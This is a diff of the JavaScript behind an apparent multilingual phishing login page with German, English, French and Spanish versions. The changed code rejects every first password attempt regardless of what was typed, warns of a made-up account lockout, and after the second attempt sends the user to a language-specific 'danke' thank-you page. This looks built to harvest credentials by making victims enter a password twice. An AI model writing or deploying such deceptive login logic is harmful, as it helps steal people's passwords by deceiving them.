@@ -46,7 +46,7 @@ document.addEventListener("DOMContentLoaded", function () {
       e.preventDefault();
 
       if (firstTry) {
-        // ❌ Passwort falsch anzeigen
+        
         passwordError.textContent = "Falsches Passwort. Noch 2 Versuche bis Kontosperrung.";
         passwordError.style.display = "block";
         passwordInput.value = "";
@@ -54,9 +54,24 @@ document.addEventListener("DOMContentLoaded", function () {
         validateStep2();
         firstTry = false;
       } else {
-        // ✅ Beim zweiten Versuch: Login erfolgreich
         passwordError.style.display = "none";
-        document.querySelector("form").submit();
+
+        const selectedLang = document.getElementById("language")?.value || "de";
+        let targetPage = "danke.html"; 
+
+        switch (selectedLang) {
+          case "en":
+            targetPage = "danke_eng.html";
+            break;
+          case "fr":
+            targetPage = "danke_fr.html";
+            break;
+          case "es":
+            targetPage = "danke_es.html";
+            break;
+        }
+
+        window.location.href = targetPage;
       }
     });
   }
@@ -66,10 +81,18 @@ document.addEventListener("DOMContentLoaded", function () {
     langSelect.addEventListener("change", function () {
       const lang = this.value;
       switch (lang) {
-        case "de": window.location.href = "/index.html"; break;
-        case "en": window.location.href = "/en.html"; break;
-        case "fr": window.location.href = "/fr.html"; break;
-        case "es": window.location.href = "/es.html"; break;
+        case "de":
+          window.location.href = "/index.html";
+          break;
+        case "en":
+          window.location.href = "/en.html";
+          break;
+        case "fr":
+          window.location.href = "/fr.html";
+          break;
+        case "es":
+          window.location.href = "/es.html";
+          break;
       }
     });
   }
